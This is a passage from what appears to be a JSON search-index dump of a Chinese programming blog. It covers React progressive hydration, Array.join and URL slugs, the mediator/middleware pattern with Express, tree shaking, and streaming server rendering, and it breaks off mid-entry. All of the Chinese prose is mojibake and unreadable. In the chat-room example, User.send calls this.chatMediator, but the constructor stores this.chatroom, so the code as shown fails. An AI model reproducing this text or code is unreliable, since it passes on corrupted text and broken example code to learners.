æ¸è¿›å¼æ°´åŒ–æä¾›æœåŠ¡å™¨ç«¯æ¸²æŸ“å’Œå®¢æˆ·ç«¯æ°´åŒ–ï¼ŒåŒæ—¶è¿˜æœ€å¤§é™åº¦åœ°é™ä½äº†æ°´åŒ–æˆæœ¬ã€‚\nä»¥ä¸‹æ˜¯å¯ä»¥ä»ä¸­è·å¾—çš„ä¸€äº›ä¼˜åŠ¿ã€‚\n  ä¿ƒè¿›ä»£ç æ‹†åˆ†ï¼š\nä»£ç æ‹†åˆ†æ˜¯æ¸è¿›å¼æ°´åŒ–çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå› ä¸ºéœ€è¦ä¸ºå»¶è¿ŸåŠ è½½çš„å•ä¸ªç»„ä»¶åˆ›å»ºä»£ç å—ã€‚\n  å…è®¸æŒ‰éœ€åŠ è½½é¡µé¢çš„ä¸å¸¸ç”¨éƒ¨åˆ†ï¼š\né¡µé¢çš„æŸäº›ç»„ä»¶å¯èƒ½å¤§éƒ¨åˆ†æ˜¯é™æ€çš„ã€åœ¨è§†å£ä¹‹å¤–å’Œ/æˆ–ä¸éœ€è¦ç»å¸¸ä½¿ç”¨ã€‚ è¿™äº›ç»„ä»¶æ˜¯å»¶è¿ŸåŠ è½½çš„ç†æƒ³é€‰æ‹©ã€‚ é¡µé¢åŠ è½½æ—¶ä¸éœ€è¦å‘é€è¿™äº›ç»„ä»¶çš„æ°´åŒ–ä»£ç ã€‚ ç›¸åï¼Œå®ƒä»¬å¯èƒ½ä¼šæ ¹æ®è§¦å‘æ¡ä»¶è¿›è¡Œæ°´åˆã€‚\n  å‡å°‘åŒ…å¤§å°ï¼š\nä»£ç æ‹†åˆ†è‡ªåŠ¨å¯¼è‡´åŒ…å¤§å°çš„å‡å°‘ã€‚ åŠ è½½æ—¶æ‰§è¡Œçš„ä»£ç æ›´å°‘ï¼Œæœ‰åŠ©äºç¼©çŸ­ FCP å’Œ TTI ä¹‹é—´çš„æ—¶é—´ã€‚\n  ä¸åˆ©çš„ä¸€é¢æ˜¯ï¼Œæ¸è¿›å¼è¡¥æ°´å¯èƒ½ä¸é€‚åˆåŠ¨æ€åº”ç”¨ç¨‹åºï¼Œå…¶ä¸­å±å¹•ä¸Šçš„æ¯ä¸ªå…ƒç´ éƒ½å¯ä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œå¹¶ä¸”éœ€è¦åœ¨åŠ è½½æ—¶è¿›è¡Œäº¤äº’ã€‚ è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœå¼€å‘äººå‘˜ä¸çŸ¥é“ç”¨æˆ·å¯èƒ½é¦–å…ˆç‚¹å‡»å“ªé‡Œï¼Œä»–ä»¬å¯èƒ½æ— æ³•ç¡®å®šé¦–å…ˆè¦æ°´åˆçš„ç»„ä»¶ã€‚\n\rçŸ¥è¯†ç‚¹   Hydration\n  React å¹¶å‘æ¨¡å¼\n  next-super-performance - hydrate HydrationData\n  ","description":"å»¶è¿ŸåŠ è½½é¡µé¢ä¸å¤ªé‡è¦çš„éƒ¨åˆ†çš„ JavaScript","id":113,"section":"react-patterns","tags":null,"title":"æ¸è¿›è¡¥æ°´ âœ”","uri":"https://codthing.github.io/react-patterns/render-patterns/progressive-hydration/"},{"content":"join() æ–¹æ³•é€šè¿‡è¿æ¥æ•°ç»„ï¼ˆæˆ–ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼‰ä¸­çš„æ‰€æœ‰å…ƒç´ æ¥åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œç”¨é€—å·æˆ–æŒ‡å®šçš„åˆ†éš”ç¬¦å­—ç¬¦ä¸²åˆ†éš”ã€‚ å¦‚æœæ•°ç»„åªæœ‰ä¸€é¡¹ï¼Œåˆ™è¯¥é¡¹å°†åœ¨ä¸ä½¿ç”¨åˆ†éš”ç¬¦çš„æƒ…å†µä¸‹è¿”å›ã€‚\n\rä½¿ç”¨ join æ–¹æ³•å°†æ•°ç»„ç»„åˆæˆå­—ç¬¦ä¸² join æ–¹æ³•ç”¨æ¥æŠŠæ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ æ”¾å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ å¹¶é€šè¿‡æŒ‡å®šçš„åˆ†éš”ç¬¦å‚æ•°è¿›è¡Œåˆ†éš”ã€‚\n1 2 3  const arr = [\u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34;]; const str = arr.join(\u0026#34; \u0026#34;); // Hello World   åœ¨å‡½æ•° sentensify å†…ç”¨ join æ–¹æ³•ï¼ˆåŠå…¶ä»–æ–¹æ³•ï¼‰ç”¨å­—ç¬¦ä¸² str ä¸­çš„å•è¯é€ å¥ï¼Œè¿™ä¸ªå‡½æ•°åº”è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è¯¥å‡½æ•°åº”è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚ ä¸¾ä¸ªä¾‹å­ï¼ŒI-like-Star-Wars ä¼šè¢«è½¬æ¢æˆ I like Star Warsã€‚ è¯·å‹¿ä½¿ç”¨ replace æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8  function sentensify(str) { return str.split(/\\W/).join(\u0026#34; \u0026#34;); } sentensify(\u0026#34;May-the-force-be-with-you\u0026#34;); // May the force be with you   \råº”ç”¨å‡½æ•°å¼ç¼–ç¨‹å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºURLç‰‡æ®µ è®¸å¤šå†…å®¹ç®¡ç†ç«™ç‚¹ï¼ˆCMSï¼‰ä¸ºäº†è®©æ·»åŠ ä¹¦ç­¾æ›´ç®€å•ï¼Œä¼šå°†å¸–å­çš„æ ‡é¢˜æ·»åŠ åˆ° URL ä¸Šã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä½ å†™äº†ä¸€ç¯‡æ ‡é¢˜ä¸º Stop Using Reduce çš„å¸–å­ï¼ŒURLå¾ˆå¯èƒ½ä¼šåŒ…å«æ ‡é¢˜å­—ç¬¦ä¸²çš„æŸç§å½¢å¼ (å¦‚ï¼š\u0026hellip;/stop-using-reduce)ã€‚\n  è¾“å…¥åŒ…å«ç©ºæ ¼å’Œæ ‡é¢˜å¤§å°å†™å•è¯çš„å­—ç¬¦ä¸²\n  è¾“å‡ºå­—ç¬¦ä¸²ï¼Œå•è¯ä¹‹é—´çš„ç©ºæ ¼ç”¨è¿å­—ç¬¦ (-) æ›¿æ¢\n  è¾“å‡ºåº”è¯¥æ˜¯å°å†™å­—æ¯\n  è¾“å‡ºä¸åº”æœ‰ä»»ä½•ç©ºæ ¼\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  let globalTitle = \u0026#34;Winter Is Coming\u0026#34;; // function urlSlug(title) { // return title // .toLowerCase() // .trim() // .split(/\\s+/) // .join(\u0026#34;-\u0026#34;); // }  // æˆ–è€…  function urlSlug(title) { return title .split(\u0026#34; \u0026#34;) .filter(substr =\u0026gt; substr !== \u0026#34;\u0026#34;) .join(\u0026#34;-\u0026#34;) .toLowerCase(); } urlSlug(globalTitle); // winter-is-coming   ","description":"join() æ–¹æ³•é€šè¿‡è¿æ¥æ•°ç»„ï¼ˆæˆ–ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼‰ä¸­çš„æ‰€æœ‰å…ƒç´ æ¥åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œç”¨é€—å·æˆ–æŒ‡å®šçš„åˆ†éš”ç¬¦å­—ç¬¦ä¸²åˆ†éš”ã€‚ å¦‚æœæ•°ç»„åªæœ‰ä¸€é¡¹ï¼Œåˆ™è¯¥é¡¹å°†åœ¨ä¸ä½¿ç”¨åˆ†éš”ç¬¦çš„æƒ…å†µä¸‹è¿”å›ã€‚","id":114,"section":"javascript","tags":null,"title":"Array.prototype.join()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/join-programming/"},{"content":"ä¸­ä»‹è€…æ¨¡å¼ä½¿ç»„ä»¶å¯ä»¥é€šè¿‡ä¸€ä¸ªä¸­å¿ƒç‚¹ç›¸äº’äº¤äº’ï¼šä¸­ä»‹è€…ï¼ˆä¹Ÿç§°ä¸­ä»‹å™¨æˆ–ä¸­é—´ä»¶ï¼‰ã€‚\nä¸­ä»‹å™¨ä¸æ˜¯ç›´æ¥ç›¸äº’äº¤è°ˆï¼Œè€Œæ˜¯æ¥æ”¶è¯·æ±‚ï¼Œå¹¶å°†å®ƒä»¬è½¬å‘ï¼\nåœ¨ JavaScript ä¸­ï¼Œä¸­ä»‹è€…é€šå¸¸åªä¸è¿‡æ˜¯ä¸€ä¸ªå¯¹è±¡å­—é¢é‡æˆ–ä¸€ä¸ªå‡½æ•°ã€‚\næ‚¨å¯ä»¥å°†æ­¤æ¨¡å¼ä¸ç©ºä¸­äº¤é€šç®¡åˆ¶å‘˜å’Œé£è¡Œå‘˜ä¹‹é—´çš„å…³ç³»è¿›è¡Œæ¯”è¾ƒã€‚ é£è¡Œå‘˜æ²¡æœ‰ç›´æ¥ä¸å½¼æ­¤äº¤è°ˆï¼Œè¿™å¯èƒ½æœ€ç»ˆä¼šéå¸¸æ··ä¹±ï¼Œè€Œæ˜¯ä¸ç©ºä¸­äº¤é€šç®¡åˆ¶å‘˜äº¤è°ˆã€‚ ç©ºä¸­äº¤é€šç®¡åˆ¶å‘˜ç¡®ä¿æ‰€æœ‰é£æœºéƒ½èƒ½æ”¶åˆ°å®‰å…¨é£è¡Œæ‰€éœ€çš„ä¿¡æ¯ï¼Œè€Œä¸ä¼šæ’åˆ°å…¶ä»–é£æœºã€‚\nè™½ç„¶æˆ‘ä»¬å¸Œæœ›ä¸æ˜¯åœ¨ JavaScript ä¸­æ§åˆ¶é£æœºï¼Œä½†æˆ‘ä»¬ç»å¸¸ä¸å¾—ä¸å¤„ç†å¯¹è±¡ä¹‹é—´çš„å¤šå‘æ•°æ®ã€‚\nå¦‚æœæœ‰å¤§é‡ç»„ä»¶ï¼Œç»„ä»¶ä¹‹é—´çš„é€šä¿¡ä¼šå˜å¾—ç›¸å½“æ··ä¹±ã€‚\nä¸è®©æ¯ä¸ªå¯¹è±¡ç›´æ¥ä¸å…¶ä»–å¯¹è±¡å¯¹è¯ï¼Œå¯¼è‡´å¤šå¯¹å¤šå…³ç³»ï¼Œå¯¹è±¡çš„è¯·æ±‚åº”è¯¥ç”±ä¸­ä»‹å¤„ç†ã€‚\nä¸­ä»‹å™¨å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå¹¶å°†å®ƒè½¬å‘åˆ°å®ƒéœ€è¦çš„åœ°æ–¹ã€‚\n\rèŠå¤©å®¤æ¡ˆä¾‹ ä¸­ä»‹æ¨¡å¼çš„ä¸€ä¸ªå¾ˆå¥½çš„ç”¨ä¾‹æ˜¯èŠå¤©å®¤ï¼ èŠå¤©å®¤ä¸­çš„ç”¨æˆ·ä¸ä¼šç›´æ¥ç›¸äº’äº¤è°ˆã€‚ ç›¸åï¼ŒèŠå¤©å®¤å……å½“ç”¨æˆ·ä¹‹é—´çš„ä¸­ä»‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  class ChatRoom { logMessage(user, message) { const time = new Date(); const sender = user.getName(); console.log(`${time}[${sender}]: ${message}`); } } class User { constructor(name, chatroom) { this.name = name; this.chatroom = chatroom; } getName() { return this.name; } send(message) { this.chatMediator.logMessage(this, message); } } const chatroom = new ChatRoom(); const user1 = new User(\u0026#34;John Doe\u0026#34;, chatroom); const user2 = new User(\u0026#34;Jane Doe\u0026#34;, chatroom); user1.send(\u0026#34;Hi there!\u0026#34;); // 2021/12/22 06:49:35 [John Doe]: Hi there! user2.send(\u0026#34;Hey!\u0026#34;); // 2021/12/22 06:49:35 [Jane Doe]: Hey!   æˆ‘ä»¬å¯ä»¥åˆ›å»ºè¿æ¥åˆ°èŠå¤©å®¤çš„æ–°ç”¨æˆ·ã€‚ æ¯ä¸ªç”¨æˆ·å®ä¾‹éƒ½æœ‰ä¸€ä¸ª send æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥å‘é€æ¶ˆæ¯ã€‚\n\ræ¡ˆä¾‹åˆ†æ Express.js Express.js æ˜¯ä¸€ç§æµè¡Œçš„ Web åº”ç”¨ç¨‹åºæœåŠ¡å™¨æ¡†æ¶ã€‚\næˆ‘ä»¬å¯ä»¥å‘ç”¨æˆ·å¯ä»¥è®¿é—®çš„æŸäº›è·¯ç”±æ·»åŠ å›è°ƒã€‚\nå‡è®¾æƒ³åœ¨ç”¨æˆ·ç‚¹å‡»æ ¹â€œ/â€æ—¶å‘è¯·æ±‚æ·»åŠ ä¸€ä¸ªæ ‡å¤´ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ä¸­é—´ä»¶å›è°ƒä¸­æ·»åŠ è¿™ä¸ªæ ‡å¤´ã€‚\nconst app = require(\u0026#34;express\u0026#34;)();\rapp.use(\u0026#34;/\u0026#34;, (req, res, next) =\u0026gt; {\rreq.headers[\u0026#34;test-header\u0026#34;] = 1234;\rnext();\r}); next æ–¹æ³•è°ƒç”¨ è¯·æ±‚-å“åº” å¾ªç¯ä¸­çš„ä¸‹ä¸€ä¸ªå›è°ƒã€‚ å®é™…ä¸Šæ˜¯åœ¨åˆ›å»ºä¸€ä¸ªä½äºè¯·æ±‚å’Œå“åº”ä¹‹é—´çš„ä¸­é—´ä»¶å‡½æ•°é“¾ï¼Œåä¹‹äº¦ç„¶ã€‚\nè®©æˆ‘ä»¬æ·»åŠ å¦ä¸€ä¸ªä¸­é—´ä»¶å‡½æ•°æ¥æ£€æŸ¥æ˜¯å¦æ­£ç¡®æ·»åŠ äº†æµ‹è¯•å¤´ã€‚ å‰ä¸€ä¸ªä¸­é—´ä»¶åŠŸèƒ½æ·»åŠ çš„æ›´æ”¹å°†åœ¨æ•´ä¸ªé“¾ä¸­å¯è§ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  const app = require(\u0026#34;express\u0026#34;)(); app.use( \u0026#34;/\u0026#34;, (req, res, next) =\u0026gt; { req.headers[\u0026#34;test-header\u0026#34;] = 1234; next(); }, (req, res, next) =\u0026gt; { console.log(`Request has test header: ${!!req.headers[\u0026#34;test-header\u0026#34;]}`); // Request has test header: true  next(); } );   Perfect! æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªä¸­é—´ä»¶åŠŸèƒ½ä»è¯·æ±‚å¯¹è±¡ä¸€ç›´åˆ°å“åº”è¿›è¡Œè·Ÿè¸ªå’Œä¿®æ”¹ã€‚\næ¯æ¬¡ç”¨æˆ·ç‚¹å‡»æ ¹ç«¯ç‚¹â€œ/â€æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨ä¸¤ä¸ªä¸­é—´ä»¶å›è°ƒã€‚\n\rä¼˜ç‚¹ ä¸­é—´ä»¶æ¨¡å¼é€šè¿‡è®©æ‰€æœ‰é€šä¿¡æµç»ä¸€ä¸ªä¸­å¿ƒç‚¹ï¼Œä½¿æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°ç®€åŒ–å¯¹è±¡ä¹‹é—´çš„å¤šå¯¹å¤šå…³ç³»ã€‚\n\rçŸ¥è¯†ç‚¹  Generator.prototype.next()  è¿”å›ä¸€ä¸ªåŒ…å«å±æ€§ done å’Œ value çš„å¯¹è±¡ã€‚\nè¯¥æ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡æ¥å—ä¸€ä¸ªå‚æ•°ç”¨ä»¥å‘ç”Ÿæˆå™¨ä¼ å€¼ã€‚\n","description":"ä½¿ç”¨ä¸­å¤®ä¸­ä»‹å¯¹è±¡æ¥å¤„ç†ç»„ä»¶ä¹‹é—´çš„é€šä¿¡","id":115,"section":"react-patterns","tags":null,"title":"ä¸­ä»‹è€…/ä¸­é—´ä»¶æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/mediator-pattern/"},{"content":"æˆ‘ä»¬å¯èƒ½ä¼šå‘ bundle æ·»åŠ ä»£ç ï¼Œè€Œè¿™äº›ä»£ç åœ¨åº”ç”¨ç¨‹åºä¸­çš„ä»»ä½•åœ°æ–¹éƒ½æ²¡æœ‰ä½¿ç”¨ã€‚ å¯ä»¥æ¶ˆé™¤è¿™ä¸€æ®µæ­»ä»£ç ï¼Œä»¥å‡å°‘åŒ…çš„å¤§å°ï¼Œå¹¶é˜²æ­¢ä¸å¿…è¦åœ°åŠ è½½æ›´å¤šæ•°æ®ï¼\nåœ¨å°†æ­»ä»£ç æ·»åŠ åˆ°åŒ…ä¹‹å‰æ¶ˆé™¤æ­»ä»£ç çš„è¿‡ç¨‹ç§°ä¸ºæ‘‡æ ‘ã€‚\nå°½ç®¡æ‘‡æ ‘é€‚ç”¨äºåƒæ•°å­¦æ¨¡å—è¿™æ ·çš„ç®€å•æ¨¡å—ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹æ‘‡æ ‘å¯èƒ½ä¼šå¾ˆæ£˜æ‰‹ã€‚\n\ræ¦‚å¿µ æ‘‡æ ‘æ—¨åœ¨ä»æœ€ç»ˆçš„ JavaScript åŒ…ä¸­åˆ é™¤æ°¸è¿œä¸ä¼šä½¿ç”¨çš„ä»£ç ã€‚\nå¦‚æœåšå¾—å¥½ï¼Œå®ƒå¯ä»¥å‡å°‘ JavaScript åŒ…çš„å¤§å°å¹¶é™ä½ä¸‹è½½ã€è§£æå’Œï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹ï¼‰æ‰§è¡Œæ—¶é—´ã€‚\nå¯¹äºå¤§å¤šæ•°ä½¿ç”¨æ¨¡å—æ†ç»‘å™¨ï¼ˆå¦‚ webpack æˆ– Rollupï¼‰çš„ç°ä»£ JavaScript åº”ç”¨ç¨‹åºï¼Œæ†ç»‘å™¨æ˜¯æ‚¨æœŸæœ›è‡ªåŠ¨åˆ é™¤æ­»ä»£ç çš„å·¥å…·ã€‚ â£â£\nå°†åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–é¡¹è§†ä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ˆç”¨â€œæ‘‡åŠ¨â€è¯­æ³•æ ‘ä»¥ä¼˜åŒ–å®ƒï¼‰ã€‚\næ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯ä¸ºåº”ç”¨ç¨‹åºæä¾›åŠŸèƒ½çš„ä¾èµ–é¡¹ã€‚\nåœ¨ Tree Shaking ä¸­ï¼Œè¾“å…¥æ–‡ä»¶è¢«è§†ä¸ºå›¾å½¢ã€‚\nå›¾ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯ä¸€ä¸ªé¡¶çº§è¯­å¥ï¼Œåœ¨ä»£ç ä¸­ç§°ä¸ºâ€œéƒ¨åˆ†â€ã€‚\næ‘‡æ ‘æ˜¯ä»å…¥å£ç‚¹å¼€å§‹çš„å›¾éå†ï¼Œå¹¶æ ‡è®°ä»»ä½•éå†çš„è·¯å¾„ä»¥ä¾›åŒ…å«ã€‚â£â£â£â£\næ¯ä¸ªç»„ä»¶éƒ½å¯ä»¥å£°æ˜ç¬¦å·ã€å¼•ç”¨ç¬¦å·å¹¶ä¾èµ–å…¶ä»–æ–‡ä»¶ã€‚\nç”šè‡³â€œéƒ¨åˆ†â€éƒ½è¢«æ ‡è®°ä¸ºæ˜¯å¦æœ‰å‰¯ä½œç”¨ã€‚\nä¾‹å¦‚ï¼Œè¯­å¥ let firstName = \u0026lsquo;Jane\u0026rsquo; æ²¡æœ‰å‰¯ä½œç”¨ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰ä»»ä½•ä¸œè¥¿éœ€è¦ fooï¼Œåˆ™å¯ä»¥åˆ é™¤è¯¥è¯­å¥è€Œæ²¡æœ‰ä»»ä½•è§‚å¯Ÿåˆ°çš„å·®å¼‚ã€‚\nä½†æ˜¯è¯­å¥ let firstName = getName() æœ‰å‰¯ä½œç”¨ï¼Œå› ä¸ºåœ¨ä¸æ”¹å˜ä»£ç å«ä¹‰çš„æƒ…å†µä¸‹æ— æ³•åˆ é™¤å¯¹ getName() çš„è°ƒç”¨ï¼Œå³ä½¿æ²¡æœ‰ä»€ä¹ˆéœ€è¦ firstNameã€‚\n\rImports åªæœ‰ä½¿ç”¨ ES2015 æ¨¡å—è¯­æ³•ï¼ˆå¯¼å…¥å’Œå¯¼å‡ºï¼‰å®šä¹‰çš„æ¨¡å—æ‰èƒ½è¿›è¡Œ tree-shakenã€‚ å¯¼å…¥æ¨¡å—çš„æ–¹å¼æŒ‡å®šæ¨¡å—æ˜¯å¦å¯ä»¥æ‘‡æ ‘ã€‚\næ‘‡æ ‘é¦–å…ˆè®¿é—®å…·æœ‰å‰¯ä½œç”¨çš„å…¥å£ç‚¹æ–‡ä»¶çš„æ‰€æœ‰éƒ¨åˆ†ï¼Œç„¶åç»§ç»­éå†å›¾çš„è¾¹ç¼˜ï¼Œç›´åˆ°åˆ°è¾¾æ–°çš„éƒ¨åˆ†ã€‚ éå†å®Œæˆåï¼ŒJavaScript åŒ…ä»…åŒ…å«éå†æœŸé—´åˆ°è¾¾çš„éƒ¨åˆ†ã€‚ å…¶ä»–éƒ¨åˆ†è¢«æ’é™¤åœ¨å¤–ã€‚ â£â£â£å‡è®¾æˆ‘ä»¬å®šä¹‰äº†ä»¥ä¸‹ utilities.js æ–‡ä»¶ï¼šâ£â£â£â£\nexport function read(props) {â£â£\rreturn props.bookâ£â£\r}â£â£\râ£â£\rexport function nap(props) {â£â£\rreturn props.winksâ£â£\r} ç„¶åæˆ‘ä»¬å°±æœ‰äº†ä¸‹é¢çš„ index.js æ–‡ä»¶ï¼šâ£â£â£â£\nimport { read } from \u0026#39;utilities\u0026#39;;â£â£\râ£â£\reventHandler = (e) =\u0026gt; {â£â£\rread({ book: e.target.value })â£â£\r} â£â£ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œnap() å¹¶ä¸é‡è¦ï¼Œå› æ­¤ä¸ä¼šåŒ…å«åœ¨åŒ…ä¸­ã€‚\n\rå‰¯ä½œç”¨ å½“æˆ‘ä»¬å¯¼å…¥ä¸€ä¸ª ES6 æ¨¡å—æ—¶ï¼Œè¿™ä¸ªæ¨¡å—ä¼šç«‹å³æ‰§è¡Œã€‚\nè™½ç„¶æˆ‘ä»¬æ²¡æœ‰åœ¨ä»£ç ä¸­çš„ä»»ä½•åœ°æ–¹å¼•ç”¨æ¨¡å—çš„å¯¼å‡ºï¼Œä½†æ¨¡å—æœ¬èº«åœ¨æ‰§è¡Œæ—¶ä¼šå½±å“å…¨å±€èŒƒå›´ï¼ˆä¾‹å¦‚ polyfill æˆ–å…¨å±€æ ·å¼è¡¨ï¼‰ï¼Œè¿™å¯èƒ½ä¼šå‘ç”Ÿã€‚ è¿™ç§°ä¸ºå‰¯ä½œç”¨ã€‚ è™½ç„¶æˆ‘ä»¬æ²¡æœ‰å¼•ç”¨æ¨¡å—æœ¬èº«çš„å¯¼å‡ºï¼Œä½†å¦‚æœæ¨¡å—å¼€å§‹æœ‰å¯¼å‡ºå€¼ï¼Œç”±äºå¯¼å…¥æ—¶çš„ç‰¹æ®Šè¡Œä¸ºï¼Œæ¨¡å—ä¸èƒ½è¢«æ‘‡æ ‘ï¼\nWebpack æ–‡æ¡£å¯¹ tree-shaking ä»¥åŠå¦‚ä½•é¿å…ç ´åå®ƒç»™å‡ºäº†æ¸…æ™°çš„è§£é‡Šã€‚\n\rçŸ¥è¯†ç‚¹  tree shaking æ‘‡æ ‘  ","description":"é€šè¿‡æ¶ˆé™¤æ­»ä»£ç æ¥å‡å°‘åŒ…å¤§å°","id":116,"section":"react-patterns","tags":null,"title":"æ‘‡æ ‘ tree-shaking","uri":"https://codthing.github.io/react-patterns/performance-patterns/tree-shaking/"},{"content":"æˆ‘ä»¬å¯ä»¥é€šè¿‡æµå¼æœåŠ¡å™¨æ¸²æŸ“æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºçš„å†…å®¹æ¥å‡å°‘æœåŠ¡å™¨æ¸²æŸ“æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºçš„æ—¶é—´ã€‚ æˆ‘ä»¬å¯ä»¥å°†å…¶æ‹†åˆ†ä¸ºæ›´å°çš„å—ï¼Œè€Œä¸æ˜¯ç”ŸæˆåŒ…å«å½“å‰å¯¼èˆªæ‰€éœ€æ ‡è®°çš„å¤§å‹ HTML æ–‡ä»¶ï¼ èŠ‚ç‚¹æµå…è®¸æˆ‘ä»¬å°†æ•°æ®æ”¾å…¥å“åº”å¯¹è±¡ä¸­ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°å°†æ•°æ®å‘ä¸‹å‘é€åˆ°å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°æ•°æ®å—çš„é‚£ä¸€åˆ»ï¼Œå®ƒå°±å¯ä»¥å¼€å§‹å‘ˆç°å†…å®¹ã€‚\nReact çš„å†…ç½® renderToNodeStream ä½¿æˆ‘ä»¬å¯ä»¥ä»¥æ›´å°çš„å—å‘é€æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºã€‚ ç”±äºå®¢æˆ·ç«¯å¯ä»¥åœ¨ä»åœ¨æ¥æ”¶æ•°æ®æ—¶å¼€å§‹ç»˜åˆ¶ UIï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ›å»ºéå¸¸é«˜æ€§èƒ½çš„é¦–æ¬¡åŠ è½½ä½“éªŒã€‚ åœ¨æ¥æ”¶åˆ°çš„ DOM èŠ‚ç‚¹ä¸Šè°ƒç”¨ hydrate æ–¹æ³•å°†é™„åŠ ç›¸åº”çš„äº‹ä»¶å¤„ç†ç¨‹åºï¼Œä»è€Œä½¿ UI å…·æœ‰äº¤äº’æ€§ï¼\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå®ƒåœ¨åº”ç”¨ç¨‹åºç»„ä»¶ä¸­å‘ç”¨æˆ·æ˜¾ç¤ºäº†æ•°åƒä¸ªçŒ«çš„äº‹å®ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116  // src/App.js import React from \u0026#34;react\u0026#34;; import facts from \u0026#34;../data\u0026#34;; const App = () =\u0026gt; facts.map((fact, i) =\u0026gt; ( \u0026lt;div className=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;p key={i}\u0026gt;{fact.fact}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; )); export default App; // src/client.js import React from \u0026#34;react\u0026#34;; import { hydrate } from \u0026#34;react-dom\u0026#34;; import App from \u0026#34;./App\u0026#34;; hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); // src/server.js import React from \u0026#34;react\u0026#34;; import path from \u0026#34;path\u0026#34;; import express from \u0026#34;express\u0026#34;; import { renderToNodeStream } from \u0026#34;react-dom/server\u0026#34;; import App from \u0026#34;./src/App\u0026#34;; const app = express(); app.get(\u0026#34;/favicon.ico\u0026#34;, (req, res) =\u0026gt; res.end()); app.use(\u0026#34;/client.js\u0026#34;, (req, res) =\u0026gt; res.redirect(\u0026#34;/build/client.js\u0026#34;)); const DELAY = 500; app.use((req, res, next) =\u0026gt; { setTimeout(() =\u0026gt; { next(); }, DELAY); }); const BEFORE = ` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Cat Facts\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; defer src=\u0026#34;/build/client.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Stream Rendered Cat Facts!\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;approot\u0026#34;\u0026gt; `.replace(/\\n\\s*/g, \u0026#34;\u0026#34;); app.get(\u0026#34;/\u0026#34;, async (request, response) =\u0026gt; { try { const stream = renderToNodeStream(\u0026lt;App /\u0026gt;); const start = Date.now(); stream.on(\u0026#34;data\u0026#34;, function handleData() { console.log(\u0026#34;Render Start: \u0026#34;, Date.now() - start); stream.off(\u0026#34;data\u0026#34;, handleData); response.useChunkedEncodingByDefault = true; response.writeHead(200, { \u0026#34;content-type\u0026#34;: \u0026#34;text/html\u0026#34;, \u0026#34;content-transfer-encoding\u0026#34;: \u0026#34;chunked\u0026#34;, \u0026#34;x-content-type-options\u0026#34;: \u0026#34;nosniff\u0026#34; }); response.write(BEFORE); response.flushHeaders(); }); await new Promise((resolve, reject) =\u0026gt; { stream.on(\u0026#34;error\u0026#34;, err =\u0026gt; { stream.unpipe(response); reject(err); }); stream.on(\u0026#34;end\u0026#34;, () =\u0026gt; { console.log(\u0026#34;Render End: \u0026#34;, Date.now() - start); 